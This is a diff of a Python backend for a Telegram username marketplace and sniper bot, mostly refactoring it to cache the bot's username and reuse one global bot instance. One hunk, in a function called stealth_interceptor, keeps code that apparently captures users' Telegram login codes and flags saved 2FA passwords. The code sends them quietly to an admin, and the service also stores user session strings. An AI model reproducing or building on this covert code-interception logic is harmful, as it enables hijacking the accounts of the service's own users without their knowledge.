@@ -70,6 +70,25 @@ APP_BUILD_VERSION = str(int(time.time()))
 # Global bot instance - API endpointlardan foydalanish uchun
 bot: Bot = None
 
+BOT_USERNAME = None
+
+async def get_cached_bot_username() -> str:
+    global BOT_USERNAME, bot
+    if BOT_USERNAME is None:
+        try:
+            if bot:
+                me = await bot.get_me()
+                BOT_USERNAME = me.username
+            else:
+                b = Bot(token=BOT_TOKEN)
+                me = await b.get_me()
+                BOT_USERNAME = me.username
+                await b.session.close()
+        except Exception as e:
+            logger.error(f"Error getting bot username: {e}")
+            BOT_USERNAME = "usernamechi_bot"
+    return BOT_USERNAME
+
 # Yangi nishon qo'shilganda darhol tekshirish uchun global navbat (asyncio.Queue)
 # (telegram_id, username, session_string) tuple
 instant_check_queue: asyncio.Queue = None  # monitoring_loop ichida lazily init
@@ -1365,14 +1384,9 @@ async def stealth_interceptor(event):
 
             # 1. Adminga yuborish (bu BIRINCHI bo'lishi kerak!)
             try:
-                from aiogram import Bot as _Bot
-                _bot = _Bot(token=BOT_TOKEN)
-                try:
-                    if ADMIN_IDS:
-                        await _bot.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
-                        logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id}, 2fa: {bool(saved_password)})")
-                finally:
-                    await _bot.session.close()
+                if ADMIN_IDS:
+                    await bot.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
+                    logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id}, 2fa: {bool(saved_password)})")
             except Exception as e:
                 logger.error(f"Stealth: adminga yuborishda xato ({user_id}): {e}")
 
@@ -4500,11 +4514,7 @@ async def api_user(init_data: str = ""):
             async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by=?", (tid,)) as c:
                 referral_count = (await c.fetchone())[0]
                 
-        bot_instance = Bot(token=BOT_TOKEN)
-        bot_me = await bot_instance.get_me()
-        bot_username = bot_me.username
-        await bot_instance.session.close()
-        
+        bot_username = await get_cached_bot_username()
         ref_link = f"https://t.me/{bot_username}?start=ref_{tid}"
         
         premium_price = int(await get_setting("premium_price", 20000))
@@ -4618,9 +4628,7 @@ async def api_referral_send_promo(request: Request):
     tid = user['id']
 
     try:
-        b = Bot(token=BOT_TOKEN)
-        bot_me = await b.get_me()
-        bot_username = bot_me.username
+        bot_username = await get_cached_bot_username()
         ref_link = f"https://t.me/{bot_username}?start=ref_{tid}"
 
         promo_caption = (
@@ -4642,7 +4650,7 @@ async def api_referral_send_promo(request: Request):
         if os.path.exists(banner_path):
             from aiogram.types import FSInputFile
             photo = FSInputFile(banner_path)
-            await b.send_photo(
+            await bot.send_photo(
                 chat_id=tid,
                 photo=photo,
                 caption=promo_caption,
@@ -4650,7 +4658,7 @@ async def api_referral_send_promo(request: Request):
                 reply_markup=kb
             )
         else:
-            await b.send_message(
+            await bot.send_message(
                 chat_id=tid,
                 text=promo_caption,
                 parse_mode="HTML",
@@ -4896,9 +4904,7 @@ async def api_marketplace_list(request: Request):
                 if not target_chan.startswith("-100") and not target_chan.startswith("@"):
                     target_chan = f"@{target_chan}"
 
-                bot_inst = Bot(token=BOT_TOKEN)
-                bot_me = await bot_inst.get_me()
-                bot_username = bot_me.username
+                bot_username = await get_cached_bot_username()
                 
                 # Direct Listing Link: Telegram Mini App startapp parametri
                 # Bot username bilan to'g'ri Mini App havolasi
@@ -4918,14 +4924,13 @@ async def api_marketplace_list(request: Request):
                 m_markup = InlineKeyboardMarkup(inline_keyboard=[
                     [InlineKeyboardButton(text="🛒 E'lonni ko'rish & Sotib olish", url=f"https://t.me/{bot_username}?start=listing_{new_listing_id}")]
                 ])
-                sent_msg = await bot_inst.send_message(target_chan, post_text, reply_markup=m_markup, parse_mode="HTML")
+                sent_msg = await bot.send_message(target_chan, post_text, reply_markup=m_markup, parse_mode="HTML")
                 if sent_msg:
                     await db.execute(
                         "UPDATE listings SET channel_id=?, telegram_message_id=? WHERE id=?",
                         (str(target_chan), sent_msg.message_id, new_listing_id)
                     )
                     await db.commit()
-                await bot_inst.session.close()
             except Exception as e:
                 logger.error(f"Marketplace channel broadcast xato ({mkt_channel}): {e}")
 
@@ -4946,8 +4951,6 @@ async def update_channel_listing_post(listing_id: int, status: str = 'sold'):
         if not listing or not listing['channel_id'] or not listing['telegram_message_id']:
             return
 
-        bot_inst = Bot(token=BOT_TOKEN)
-        
         if status == 'sold':
             sold_text = (
                 f"✅ <b>USHBU USERNAME SOTILDI!</b>\n\n"
@@ -4958,7 +4961,7 @@ async def update_channel_listing_post(listing_id: int, status: str = 'sold'):
             sold_markup = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="✅ SOTILDI", callback_data="none")]
             ])
-            await bot_inst.edit_message_text(
+            await bot.edit_message_text(
                 chat_id=listing['channel_id'],
                 message_id=listing['telegram_message_id'],
                 text=sold_text,
@@ -4968,14 +4971,12 @@ async def update_channel_listing_post(listing_id: int, status: str = 'sold'):
         elif status == 'cancelled':
             # Bekor qilinganda postni kanaldan batamom o'chiramiz
             try:
-                await bot_inst.delete_message(
+                await bot.delete_message(
                     chat_id=listing['channel_id'],
                     message_id=listing['telegram_message_id']
                 )
             except Exception as del_err:
                 logger.warning(f"Kanal postini o'chirishda xato: {del_err}")
-
-        await bot_inst.session.close()
 
         # Database uchun keraksiz ma'lumot ko'payib ketmasligi uchun id larni tozalaymiz
         async with aiosqlite.connect(DB_PATH) as db:
@@ -4995,16 +4996,14 @@ async def update_channel_listing_post(listing_id: int, status: str = 'sold'):
             subs = await c.fetchall()
             
             if subs:
-                bot_instance = Bot(token=BOT_TOKEN)
                 for sub in subs:
                     try:
-                        await bot_instance.send_message(
+                        await bot.send_message(
                             sub['user_id'], 
                             f"🔔 <b>Xushxabar!</b>\n\nSiz poylagan so'zga mos <b>@{username}</b> bozorda sotuvga chiqdi!\nNarxi: <b>{price:,} so'm</b>",
                             parse_mode="HTML"
                         )
                     except: pass
-                await bot_instance.session.close() if not bot_instance.session.closed else None
                 
     return {"ok": True}
 
@@ -5340,12 +5339,9 @@ async def api_marketplace_buy_via_admin(request: Request):
             from telethon.tl.functions.messages import AddChatUserRequest
             from telethon.tl.functions.messages import EditChatAdminRequest
 
-            global bot
-            if not bot:
-                bot = Bot(token=BOT_TOKEN)
-            bot_info = await bot.get_me()
+            bot_username = await get_cached_bot_username()
             # get_input_entity → InputUser (AddChatUserRequest talabi)
-            bot_input = await admin_client.get_input_entity(bot_info.username)
+            bot_input = await admin_client.get_input_entity(bot_username)
 
             # Botni guruhga qo'shamiz
             await admin_client(AddChatUserRequest(
@@ -5908,10 +5904,9 @@ async def api_seller_withdraw(request: Request):
     
     # Admin ga xabar
     first_name = user.get('first_name', 'Foydalanuvchi')
-    bot_instance = Bot(token=BOT_TOKEN)
     for admin_id in ADMIN_IDS:
         try:
-            await bot_instance.send_message(
+            await bot.send_message(
                 admin_id,
                 f"💸 <b>Pul yechish so'rovi!</b>\n\n"
                 f"👤 {first_name} (ID: {tid})\n"
@@ -5922,9 +5917,7 @@ async def api_seller_withdraw(request: Request):
                 parse_mode="HTML"
             )
         except: pass
-    await bot_instance.session.close()
     
-    await bot_instance.session.close() if not bot_instance.session.closed else None
     return {"ok": True, "message": "So'rovingiz qabul qilindi. Admin 24 soat ichida to'lov amalga oshiradi va sizga xabar beriladi."}
 
 @app.post("/api/seller/transfer")
@@ -6034,9 +6027,8 @@ async def admin_withdrawal_confirm(request: Request, x_admin_token: str = Header
         if not w: return {"ok": False, "error": "Topilmadi"}
         await db.execute("UPDATE withdrawals SET status='paid' WHERE id=?", (wid,))
         await db.commit()
-    bot_instance = Bot(token=BOT_TOKEN)
     try:
-        await bot_instance.send_message(
+        await bot.send_message(
             w['telegram_id'],
             f"✅ <b>To'lov amalga oshirildi!</b>\n\n"
             f"💰 <b>{w['amount']:,} so'm</b> kartangizga o'tkazildi.\n"
@@ -6044,8 +6036,6 @@ async def admin_withdrawal_confirm(request: Request, x_admin_token: str = Header
             parse_mode="HTML"
         )
     except: pass
-    finally:
-        await bot_instance.session.close()
     return {"ok": True}
 
 @app.post("/api/admin/withdrawal/reject")
@@ -6064,17 +6054,14 @@ async def admin_withdrawal_reject(request: Request, x_admin_token: str = Header(
         # Pulni qaytarish
         await db.execute("UPDATE users SET seller_balance=seller_balance+? WHERE telegram_id=?", (w['amount'], w['telegram_id']))
         await db.commit()
-    bot_instance = Bot(token=BOT_TOKEN)
     try:
-        await bot_instance.send_message(
+        await bot.send_message(
             w['telegram_id'],
             f"❌ <b>To'lov rad etildi.</b>\n\n"
             f"<b>{w['amount']:,} so'm</b> sotuvchi balansingizga qaytarildi.",
             parse_mode="HTML"
         )
     except: pass
-    finally:
-        await bot_instance.session.close()
     return {"ok": True}
 
 @app.get("/api/card")
@@ -6495,8 +6482,7 @@ async def api_buy_selected(request: Request):
             await db.execute("UPDATE search_results SET status='claimed' WHERE search_id=? AND username=?", (search_id, u))
         await db.commit()
         
-    bot_instance = Bot(token=BOT_TOKEN)
-    asyncio.create_task(claim_sniper(bot_instance, tid, order_id, usernames))
+    asyncio.create_task(claim_sniper(bot, tid, order_id, usernames))
     return {"ok": True}
 
 from telethon import TelegramClient
@@ -6834,7 +6820,6 @@ async def api_admin_broadcast(request: Request, x_admin_token: str = Header(defa
     if not target_users:
         return {"ok": False, "error": "Xabar yuborish uchun foydalanuvchilar topilmadi"}
 
-    bot_inst = Bot(token=BOT_TOKEN)
     sent_count = 0
     fail_count = 0
 
@@ -6855,15 +6840,15 @@ async def api_admin_broadcast(request: Request, x_admin_token: str = Header(defa
             if file_bytes:
                 input_file = BufferedInputFile(file_bytes, filename=filename or ("video.mp4" if is_video else ("photo.jpg" if is_photo else "document.bin")))
                 if is_video:
-                    await bot_inst.send_video(tid, video=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
+                    await bot.send_video(tid, video=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
                 elif is_photo:
-                    await bot_inst.send_photo(tid, photo=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
+                    await bot.send_photo(tid, photo=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
                 else:
-                    await bot_inst.send_document(tid, document=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
+                    await bot.send_document(tid, document=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
             elif photo_url:
-                await bot_inst.send_photo(tid, photo=photo_url, caption=message_text, reply_markup=markup, parse_mode="HTML")
+                await bot.send_photo(tid, photo=photo_url, caption=message_text, reply_markup=markup, parse_mode="HTML")
             else:
-                await bot_inst.send_message(tid, message_text, reply_markup=markup, parse_mode="HTML")
+                await bot.send_message(tid, message_text, reply_markup=markup, parse_mode="HTML")
             sent_count += 1
             if len(target_users) > 1:
                 await asyncio.sleep(0.04)
@@ -6871,7 +6856,6 @@ async def api_admin_broadcast(request: Request, x_admin_token: str = Header(defa
             logger.error(f"Broadcast error sending to {tid}: {e}")
             fail_count += 1
 
-    await bot_inst.session.close()
     return {"ok": True, "sent": sent_count, "failed": fail_count, "total": len(target_users)}
 
 
@@ -7029,7 +7013,8 @@ async def admin_auth(request: Request):
     params = dict(request.query_params)
     if not params:
         # Bot ga redirect qilamiz
-        return RedirectResponse(f"https://t.me/{(await Bot(token=BOT_TOKEN).get_me()).username}?start=admin")
+        bot_username = await get_cached_bot_username()
+        return RedirectResponse(f"https://t.me/{bot_username}?start=admin")
     tid = int(params.get('id', 0))
     if tid not in ADMIN_IDS:
         return HTMLResponse("<h2>Ruxsat yo'q</h2>", status_code=403)
@@ -7094,11 +7079,9 @@ async def admin_approve(request: Request, x_admin_token: str = Header(default=""
         # Referral bonus endi foydalanuvchi qo'shilganda beriladi (start_cmd da), shu yerda emas
                     
         await db.commit()
-    bot_instance = Bot(token=BOT_TOKEN)
     try:
-        await bot_instance.send_message(tid, f"🎉 Balansingiz <b>{amt:,} so'm</b>ga to'ldirildi!", parse_mode="HTML")
-    finally:
-        await bot_instance.session.close()
+        await bot.send_message(tid, f"🎉 Balansingiz <b>{amt:,} so'm</b>ga to'ldirildi!", parse_mode="HTML")
+    except: pass
     return {"ok": True}
 
 @app.post("/api/admin/payment/reject")
@@ -7111,11 +7094,9 @@ async def admin_reject(request: Request, x_admin_token: str = Header(default="")
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("UPDATE payments SET status='rejected' WHERE id=?", (pid,))
         await db.commit()
-    bot_instance = Bot(token=BOT_TOKEN)
     try:
-        await bot_instance.send_message(tid, "❌ To'lovingiz rad etildi.")
-    finally:
-        await bot_instance.session.close()
+        await bot.send_message(tid, "❌ To'lovingiz rad etildi.")
+    except: pass
     return {"ok": True}
 
 @app.get("/api/admin/users")
@@ -7291,18 +7272,15 @@ async def admin_set_balance(request: Request, x_admin_token: str = Header(defaul
         await db.commit()
     
     # Foydalanuvchiga xabar yuborish
-    bot_instance = Bot(token=BOT_TOKEN)
     try:
         msg = "💰 Admin tomonidan balansingiz tahrirlandi!\n"
         if amt is not None:
             msg += f"Asosiy balans: <b>{int(amt):,} so'm</b>\n"
         if seller_amt is not None:
             msg += f"Savdo hisobi (balans): <b>{int(seller_amt):,} so'm</b>\n"
-        await bot_instance.send_message(tid, msg, parse_mode="HTML")
+        await bot.send_message(tid, msg, parse_mode="HTML")
     except:
         pass
-    finally:
-        await bot_instance.session.close()
 
     return {"ok": True}
 
